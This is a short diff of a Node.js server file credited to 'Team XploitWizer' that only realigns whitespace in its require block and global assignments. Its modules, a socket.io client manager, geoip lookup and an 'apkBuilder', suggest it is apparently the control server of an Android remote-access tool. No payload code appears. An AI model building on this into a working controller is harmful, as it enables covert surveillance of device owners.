@@ -4,25 +4,26 @@
  *   By Team XploitWizer
  */
 
-const express = require('express'),
-	app = express(),
-	server = require('http').createServer(app),
-	IO = require('socket.io')(server),
-	path = require('path'),
-	geoip = require('geoip-lite'),
-	CONST = require(path.join(__dirname, '/includes/const')),
-	db = require(path.join(__dirname, '/includes/databaseGateway')),
-	logManager = require(path.join(__dirname, '/includes/logManager')),
-	clientManager = new (require(path.join(__dirname, '/includes/clientManager')))(db),
-	apkBuilder = require(path.join(__dirname, '/includes/apkBuilder'));
-port = process.env.PORT || CONST.web_port;
+const express 		= require('express'),
+	app 		= express(),
+	server 		= require('http').createServer(app),
+	IO 		= require('socket.io')(server),
+	path 		= require('path'),
+	geoip 	      	= require('geoip-lite'),
+	CONST	      	= require(path.join(__dirname, '/includes/const')),
+	db 	      	=	require(path.join(__dirname, '/includes/databaseGateway')),
+	logManager    	=	require(path.join(__dirname, '/includes/logManager')),
+	clientManager 	= new (require(path.join(__dirname, '/includes/clientManager')))(db),
+	apkBuilder    	=	require(path.join(__dirname, '/includes/apkBuilder'));
 
-global.CONST = CONST;
-global.db = db;
-global.logManager = logManager;
-global.app = app;
-global.clientManager = clientManager;
-global.apkBuilder = apkBuilder;
+port 			= process.env.PORT || CONST.web_port;
+
+global.CONST 		= CONST;
+global.db 		= db;
+global.logManager 	= logManager;
+global.app 		= app;
+global.clientManager 	= clientManager;
+global.apkBuilder 	= apkBuilder;
 
 // spin up socket server
 // let client_io = IO.listen(CONST.control_port);
